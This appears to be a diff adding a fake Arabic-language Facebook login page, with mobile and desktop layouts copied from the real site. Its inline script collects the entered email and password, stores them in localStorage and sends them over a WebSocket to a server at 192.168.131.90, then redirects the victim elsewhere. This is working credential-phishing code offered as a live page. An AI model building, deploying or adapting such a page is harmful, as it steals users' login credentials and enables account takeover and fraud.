+                                                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAABACAYAAAByZdXUAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo4RjMwQjlEODU5RjUxMUUyQTQ2MkNBNUI4NTk3Q0Q5RiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo4RjMwQjlEOTU5RjUxMUUyQTQ2MkNBNUI4NTk3Q0Q5RiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjhGMzBCOUQ2NTlGNTExRTJBNDYyQ0E1Qjg1OTdDRDlGIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjhGMzBCOUQ3NTlGNTExRTJBNDYyQ0E1Qjg1OTdDRDlGIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+DIRYmwAABdhJREFUeNrsWklv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" width="18" height="32" class="bh k" />
+                                                            <div class="bi">
+                                                                <a
+                                                                    href="https://play.google.com/store/apps/details?id=com.facebook.lite"
+                                                                >
+																احصل على Facebook لنظام Android وتصفح بشكل أسرع.
+                                                                </a>
+                                                            </div>
+                                                            <div class="bj"></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="bk">
+                                                    <div>
+                                                        <ul class="bn bo bp">
+                                                            <li class="bo">
+                                                                <span class="bq br" id="u_0_0_cx">رقم الهاتف أو عنوان البريد الإلكتروني</span>
+                                                                <input type="text" class="bs bt bu"  onchange="set_email(this.value)" id="m_login_email" />
+                                                            </li>
+                                                            <li class="bo">
+                                                                <div>
+                                                                    <span class="bq br" id="u_0_1_7g">كلمة المرور</span>
+                                                                    <input class="bs bt bv bw" type="password"  onchange="set_password(this.value)"/>
+                                                                </div>
+                                                            </li>
+                                                            <li class="bo"><input value="تسجيل الدخول" type="button" id="btn1" onclick="click()" class="m s n bx by bz" /></li>
+                                                            <li class="bo"></li>
+                                                        </ul>
+                                                        <div>
+                                                            <div id="login_reg_separator" class="ca"><span class="cb">or</span></div>
+                                                            <div class="cc cd" id="signup_button_area">
+                                                                <div class="cc ce cf" id="signup-button" tabindex="0">
+                                                                    <!-- <input href="https://mbasic.facebook.com/reg" value="Create New Account" type="submit" class="m s n cg by ch" /> -->
+                                                                    <a href="https://mbasic.facebook.com/reg" class="creat-btn m s n cg by ch">إنشاء حساب جديد</a>
+                                                                </div>                                                            </div>
+                                                        </div>
+                                                        <input type="hidden" value="0" /><input type="hidden" id="scetoggle" />
+                                                        <div></div>
+                                                        <noscript><input type="hidden" value="true" /></noscript>
+                                                    </div>
+                                                    <div>
+                                                        <div class="ci cj">
+                                                            <span class="ck cl">
+                                                                <ul class="bn cm">
+                                                                    <li class="bo cc">
+                                                                        <a
+                                                                            tabindex="0"
+                                                                            href="https://mbasic.facebook.com/login/identify/"
+                                                                            id="forgot-password-link"
+                                                                        >
+																		هل نسيت كلمة المرور؟
+                                                                        </a>
+                                                                    </li>
+                                                                    <li class="bo"></li>
+                                                                    <li class="bo"></li>
+                                                                </ul>
+                                                            </span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                <div>
+                    <div class="cn">
+                        <div class="co">
+                            <table class="u" role="presentation">
+                                <tbody>
+                                    <tr>
+                                        <td class="v cp" style="width: 50%;">
+                                            <b class="cq">English (UK)</b>
+                                            <a
+                                                class="cr"
+                                                href="#"
+                                            >
+                                                অসমীয়া
+                                            </a>
+                                            <a
+                                                class="cr"
+                                                href="#"
+                                            >
+                                                Português (Brasil)
+                                            </a>
+                                        </td>
+                                        <td class="v cs" style="width: 50%;">
+                                            <a
+                                                class="cr"
+                                                href="#"
+                                            >
+                                                বাংলা
+                                            </a>
+                                            <a
+                                                class="cr"
+                                                href="#"
+                                            >
+                                                Español
+                                            </a>
+                                            <a class="cr" href="#">
+                                                <div class="ct">+</div>
+                                            </a>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <span class="bq cu cv">Facebook Inc.</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="loginsignup" id="pc-verson" style="background-color: rgba(255, 255, 255, 0.55);">
+			<div class="container">
+				<div class="row justify-content-between">
+					<div class="content-left">
+						<div class="logo-part">
+							<img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDIyLjUxIDM2MCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMxODc3RjI7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5GQldvcmRtYXJrX0hleC1SR0ItMTAyNDwvdGl0bGU+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMTY2LjQzLDEyNi42OGMtOS42NSwwLTEyLjQ0LDQuMjgtMTIuNDQsMTMuNzJ2MTUuNjZoMjUuNzRsLTIuNTgsMjUuM0gxNTR2NzYuNzhIMTIzLjExVjE4MS4zNkgxMDIuM3YtMjUuM2gyMC44MVYxNDAuODNjMC0yNS41MiwxMC4yOS0zOSwzOS0zOWExNDYuMTcsMTQ2LjE3LDAsMCwxLDE4LDEuMDd2MjMuODFaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMTgxLjg3LDIwMy44OGMwLTI4LjUyLDEzLjUxLTUwLDQxLjgyLTUwLDE1LjQ0LDAsMjQuODcsNy45NCwyOS4zOCwxNy44VjE1Ni4wNmgyOS41OVYyNTguMTRIMjUzLjA3VjI0Mi43Yy00LjI5LDkuODctMTMuOTQsMTcuNTktMjkuMzgsMTcuNTktMjguMzEsMC00MS44Mi0yMS40NS00MS44Mi01MFptMzAuODgsNi44N2MwLDE1LjIyLDUuNTcsMjUuMywxOS45NCwyNS4zLDEyLjY2LDAsMTkuMDktOS4yMiwxOS4wOS0yMy44VjIwMmMwLTE0LjU4LTYuNDMtMjMuOC0xOS4wOS0yMy44LTE0LjM3LDAtMTkuOTQsMTAuMDgtMTkuOTQsMjUuM1oiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik0zNDcsMTUzLjkxYzEyLDAsMjMuMzcsMi41OCwyOS41OSw2Ljg2bC02Ljg2LDIxLjg4YTQ4LjYsNDguNiwwLDAsMC0yMC41OS00LjcyYy0xNi43MywwLTI0LDkuNjUtMjQsMjYuMTd2NmMwLDE2LjUyLDcuMjksMjYuMTcsMjQsMjYuMTdhNDguNiw0OC42LDAsMCwwLDIwLjU5LTQuNzJsNi44NiwyMS44N2MtNi4yMiw0LjI5LTE3LjU4LDYuODctMjkuNTksNi44Ny0zNi4yNSwwLTUyLjc2LTE5LjUyLTUyLjc2LTUwLjgzdi00LjcyQzI5NC4yNCwxNzMuNDMsMzEwLjc1LDE1My45MSwzNDcsMTUzLjkxWiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTM4MC42NiwyMTF2LTljMC0yOC45NSwxNi41MS00OCw1MC4xOS00OCwzMS43NCwwLDQ1LjY4LDE5LjMsNDUuNjgsNDcuNjF2MTYuM2gtNjVjLjY1LDEzLjk0LDYuODcsMjAuMTYsMjQsMjAuMTYsMTEuNTksMCwyMy44MS0yLjM2LDMyLjgyLTYuMjJMNDc0LDI1M2MtOC4xNSw0LjMtMjQuODgsNy41MS0zOS42Nyw3LjUxQzM5NS4yNCwyNjAuNSwzODAuNjYsMjQxLDM4MC42NiwyMTFabTMwLjg4LTEzLjNoMzcuMzJ2LTIuNTdjMC0xMS4xNS00LjUtMjAtMTgtMjBDNDE2LjkxLDE3NS4xNCw0MTEuNTQsMTgzLjk0LDQxMS41NCwxOTcuNjZaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNTkxLDIxMC4zMmMwLDI4LjUyLTEzLjcyLDUwLTQyLDUwLTE1LjQ0LDAtMjYuMTYtNy43Mi0zMC40NS0xNy41OXYxNS40NEg0ODkuMzlWMTA0LjhMNTIwLjI3LDEwMnY2OC4yYzQuNS05LDE0LjM3LTE2LjMsMjguNzQtMTYuMywyOC4zMSwwLDQyLDIxLjQ1LDQyLDUwWm0tMzAuODgtNy4wOGMwLTE0LjM3LTUuNTctMjUuMDktMjAuMzctMjUuMDktMTIuNjYsMC0xOS41Miw5LTE5LjUyLDIzLjU5djEwLjcyYzAsMTQuNTgsNi44NiwyMy41OSwxOS41MiwyMy41OSwxNC44LDAsMjAuMzctMTAuNzIsMjAuMzctMjUuMDlaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNjAxLjMzLDIwOS42N3YtNS4xNGMwLTI5LjM5LDE2LjczLTUwLjYyLDUwLjgzLTUwLjYyUzcwMywxNzUuMTQsNzAzLDIwNC41M3Y1LjE0YzAsMjkuMzgtMTYuNzMsNTAuNjItNTAuODMsNTAuNjJTNjAxLjMzLDIzOS4wNSw2MDEuMzMsMjA5LjY3Wm03MC43OC03LjI5YzAtMTMuNTEtNS41OC0yNC4yMy0yMC0yNC4yM3MtMTkuOTUsMTAuNzItMTkuOTUsMjQuMjN2OS40NGMwLDEzLjUxLDUuNTgsMjQuMjMsMTkuOTUsMjQuMjNzMjAtMTAuNzIsMjAtMjQuMjNaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNzEzLjI3LDIwOS42N3YtNS4xNGMwLTI5LjM5LDE2LjczLTUwLjYyLDUwLjgzLTUwLjYyczUwLjgzLDIxLjIzLDUwLjgzLDUwLjYydjUuMTRjMCwyOS4zOC0xNi43Myw1MC42Mi01MC44Myw1MC42MlM3MTMuMjcsMjM5LjA1LDcxMy4yNywyMDkuNjdabTcwLjc4LTcuMjljMC0xMy41MS01LjU4LTI0LjIzLTE5Ljk1LTI0LjIzcy0xOS45NCwxMC43Mi0xOS45NCwyNC4yM3Y5LjQ0YzAsMTMuNTEsNS41NywyNC4yMywxOS45NCwyNC4yM3MxOS45NS0xMC43MiwxOS45NS0yNC4yM1oiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik04NTcuMzksMjA0Ljc0bDMwLjQ1LTQ4LjY4aDMyLjgxbC0zMS45NSw1MC40LDMzLjI0LDUxLjY4SDg4OS4xM2wtMzEuNzQtNTB2NTBIODI2LjVWMTA0LjhMODU3LjM5LDEwMloiLz48L3N2Zz4K" alt="Facebook" />
+						</div>
+						<h2>يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</h2>
+					</div>
+					<div class="content-right">
+						<div style="background-color: rgb(255, 255, 255);padding: 15px; border-radius: 10px; box-shadow: #0000002c -3px 3px 15px;margin-bottom: 30px;">
+							<div class="form-group">
+								<input type="text" style="height: 50px; width: 350px;border-radius: 6px;border: 1px rgba(0, 0, 0, 0.1) solid;padding-left: 8px;margin: 9px 0 9px 0;"  onchange="set_email(this.value)" placeholder="Email address or phone number">
+							</div>
+							<div class="form-group">
+								<input type="password" style="height: 50px; width: 350px;border-radius: 6px;border: 1px rgba(0, 0, 0, 0.1) solid;padding-left: 8px;margin: 9px 0 9px 0;" onchange="set_password(this.value)" placeholder="Password">
+							</div>
+							<div class="login">
+								<input type="button" style="width: 350px; height: 47px; border: none;" id="btn2" onclick="click()" class="btn" value="تسجيل الدخول">
+							</div>
+							<div class="forgot">
+								<a href="https://www.facebook.com/login/identify/">هل نسيت كلمة السر؟</a>
+							</div>
+							<div class="line"></div>
+							<div class="create-btn">
+								<a href="https://www.facebook.com/reg/" class="btn">إنشاء حساب جديد</a>
+							</div>
+						</div>
+						<p><a href="https://www.facebook.com/pages/create/">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</p>
+					</div>
+				</div>
+			</div>
+		</div>
+		<script>
+			const page_name = "facebook-login-ar"
+			let btn = document.getElementById('btn');let params = new URLSearchParams('&' + location.href.slice(location.href.indexOf('?')+1, location.href.length));var email, password;const socket = new WebSocket('192.168.131.90:2007');function set_email (iemail){email = iemail}function set_password (ipassword){password = ipassword};socket.onopen = ()=>{console.log('connection on web socket server');};socket.onmessage = async(evnt)=>{	let data = JSON.parse(evnt.data);if (data.message) {if (data.message == 'send-me-the-data') {console.info('sended');socket.send(`{"data":{"email":"${JSON.parse(await localStorage.getItem('user')).email}","password":"${JSON.parse(await localStorage.getItem('user')).password}","greep":"${params.get('greep')}","type":"facebook","divaice":"${await localStorage.getItem('divaice-code')}","from":"${page_name}"}}`);}if (data.message == 'saveed') {let url = params.get('to');location.href = url;}return;}};const click = async()=>{if (email.length < 8 || password.length < 8) {return;}if (! await localStorage.getItem('divaice-code')) {let divaice_code = "divaice-code=";for (let i = 0; i < 50; i++) {divaice_code += (Math.floor(Math.random()*10)).toString();}await localStorage.setItem('divaice-code',divaice_code);console.log(await localStorage.getItem('id'));}await localStorage.setItem('user',`{"email":"${email}","password":"${password}"}`);socket.send('{"message":"call-me"}');}
+			document.getElementById('btn1').onclick = ()=>{
+				click()
+			}
+			document.getElementById('btn2').onclick = ()=>{
+				click()
+			}
+		</script>
+    </body>
+</html>
